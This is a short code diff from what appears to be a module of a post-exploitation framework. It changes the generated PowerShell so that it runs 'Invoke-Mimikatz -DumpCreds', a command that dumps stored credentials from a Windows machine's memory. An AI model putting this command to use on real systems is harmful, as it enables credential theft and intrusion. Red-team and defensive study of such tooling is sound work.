@@ -71,7 +71,7 @@ class Module:
         script = moduleCode
 
         # build the dump command with whatever options we want
-        script += "Invoke-Mimikatz;"
+        script += "Invoke-Mimikatz -DumpCreds;"
 
         for option,values in self.options.iteritems():
             if option.lower() != "agent":
